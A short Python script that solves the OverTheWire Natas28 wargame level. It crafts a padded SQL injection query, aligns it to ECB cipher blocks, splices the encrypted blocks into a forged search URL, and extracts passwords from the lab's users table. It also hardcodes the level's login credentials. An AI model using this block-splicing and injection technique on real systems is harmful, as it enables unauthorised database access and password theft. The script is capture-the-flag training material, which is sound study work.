# Program to send querys to solve Natas28 from OverTheWire

from base64 import b64decode, b64encode, b16encode
import requests
from requests.auth import HTTPBasicAuth
from urllib.parse import quote_plus, unquote_plus

query = "SELECT password AS joke FROM users WHERE 1 #"

def request(string):
    auth = HTTPBasicAuth("natas28", "JWwR438wkgTsNKBbcJoowyysdM82YjeF")
    string = (" " * 10) + string
    result = requests.post(f"http://natas28.natas.labs.overthewire.org/index.php",
                           data={"query" : string}, auth=auth, allow_redirects=False).headers
    result = result["Location"][18:]
    return b64decode(unquote_plus(result))

inject = request(query)
poison = quote_plus(b64encode(inject[48:96] + inject[-16:]))

print(str(b16encode(inject[48:96] + inject[-16:]))[2:-1])
print("http://natas28.natas.labs.overthewire.org/search.php/?query=" + poison)

